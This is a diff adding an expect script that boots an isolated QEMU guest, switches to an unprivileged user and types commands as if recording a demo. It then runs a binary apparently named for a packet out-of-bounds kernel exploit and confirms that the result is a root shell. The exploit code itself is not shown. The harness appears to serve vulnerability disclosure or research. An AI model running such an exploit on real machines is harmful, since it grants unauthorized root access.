@@ -1,0 +1,161 @@
+#!/usr/bin/expect -f
+
+set timeout 240
+set kernel $env(PACKET_OOB_KERNEL)
+set initrd $env(PACKET_OOB_INITRD)
+set rootfs $env(PACKET_OOB_ROOTFS)
+set repo $env(PACKET_OOB_REPO)
+set serial_log $env(PACKET_OOB_SERIAL_LOG)
+set root_prompt "root@localhost:/# "
+set user_prompt_end "$ \033\[38;5;250m"
+set privileged_prompt_end "# \033\[38;5;250m"
+
+proc stop_vm {pid} {
+    catch {exec kill $pid}
+    after 750
+}
+
+proc wait_exact {pattern vm_pid} {
+    expect {
+        -exact $pattern {}
+        timeout {
+            stop_vm $vm_pid
+            puts stderr "guest command timed out"
+            exit 1
+        }
+        eof {
+            puts stderr "guest exited unexpectedly"
+            exit 1
+        }
+    }
+}
+
+proc root_command {command root_prompt vm_pid} {
+    send -- "$command\r"
+    wait_exact $root_prompt $vm_pid
+}
+
+proc type_command {command vm_pid} {
+    foreach character [split $command ""] {
+        send -- "$character"
+        expect {
+            -exact $character {}
+            timeout {
+                stop_vm $vm_pid
+                puts stderr "guest did not echo typed character"
+                exit 1
+            }
+            eof {
+                puts stderr "guest exited while typing a command"
+                exit 1
+            }
+        }
+        after [expr {35 + int(rand() * 55)}]
+    }
+    send -- "\r"
+}
+
+proc user_command {command prompt_end vm_pid pause_ms} {
+    type_command $command $vm_pid
+    wait_exact $prompt_end $vm_pid
+    after $pause_ms
+}
+
+log_user 0
+spawn -noecho qemu-system-x86_64 \
+    -name packet-oob-asciinema \
+    -m 5G -smp 4 -enable-kvm -cpu host \
+    -display none -no-reboot -monitor none \
+    -chardev "stdio,id=serial0,signal=off,logfile=$serial_log" \
+    -serial chardev:serial0 \
+    -kernel $kernel -initrd $initrd \
+    -drive "file=$rootfs,if=virtio,cache=none,aio=native,format=raw,readonly=on" \
+    -nic user,model=virtio-net-pci,restrict=on \
+    -virtfs "local,path=$repo,mount_tag=hostshare,security_model=mapped-xattr" \
+    -append "console=ttyS0 root=/dev/vda1 rootfstype=ext4 ro panic=0 quiet loglevel=1 init=/bin/bash --"
+set vm_pid [exp_pid]
+
+expect {
+    -exact $root_prompt {}
+    timeout {
+        stop_vm $vm_pid
+        puts stderr "guest boot timed out"
+        exit 1
+    }
+    eof {
+        puts stderr "guest exited during boot"
+        exit 1
+    }
+}
+
+root_command "mount -t tmpfs tmpfs /tmp" $root_prompt $vm_pid
+root_command "mkdir -p /tmp/poc" $root_prompt $vm_pid
+root_command "mount -t 9p -o trans=virtio hostshare /tmp/poc" $root_prompt $vm_pid
+root_command "chmod 666 /dev/fuse" $root_prompt $vm_pid
+root_command "hostname packet-oob-lab" $root_prompt $vm_pid
+send -- "cd /tmp/poc && exec setpriv --reuid=1000 --regid=1000 --clear-groups /bin/bash --noprofile --norc\r"
+expect {
+    -re {bash-[0-9.]+\$ $} {}
+    timeout {
+        stop_vm $vm_pid
+        puts stderr "failed to enter the UID 1000 shell"
+        exit 1
+    }
+}
+
+send -- "stty cols 120 rows 36\r"
+expect -re {bash-[0-9.]+\$ $}
+set colour_setup {export PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ \[\e[38;5;250m\]'; export PS0=$'\e[0m'}
+send -- "$colour_setup\r"
+expect -exact $user_prompt_end
+send -- "clear\r"
+expect -exact $user_prompt_end
+
+log_user 1
+send -- "\r"
+wait_exact $user_prompt_end $vm_pid
+after 800
+
+user_command "cat /etc/os-release" $user_prompt_end $vm_pid 2000
+user_command "uname -a" $user_prompt_end $vm_pid 2000
+user_command "id" $user_prompt_end $vm_pid 2000
+user_command "grep -E '^Cap(Inh|Prm|Eff|Amb):' /proc/self/status" $user_prompt_end $vm_pid 2000
+user_command "cat /proc/cmdline" $user_prompt_end $vm_pid 2000
+
+type_command "./build/03390aa-packet-oob --exploit" $vm_pid
+expect {
+    -exact $privileged_prompt_end {}
+    -re {\[-\] exploit child exited with status [0-9]+} {
+        stop_vm $vm_pid
+        puts stderr "exploit returned without the root proof"
+        exit 1
+    }
+    timeout {
+        stop_vm $vm_pid
+        puts stderr "exploit did not produce the root proof before timeout"
+        exit 1
+    }
+    eof {
+        puts stderr "guest exited before the root proof"
+        exit 1
+    }
+}
+after 2000
+
+type_command "id" $vm_pid
+expect {
+    -re {uid=0\(root\) gid=0\(root\) groups=0\(root\)} {}
+    timeout {
+        stop_vm $vm_pid
+        puts stderr "interactive shell did not produce the UID 0 proof"
+        exit 1
+    }
+    eof {
+        puts stderr "guest exited before the interactive UID 0 proof"
+        exit 1
+    }
+}
+wait_exact $privileged_prompt_end $vm_pid
+after 2000
+
+stop_vm $vm_pid
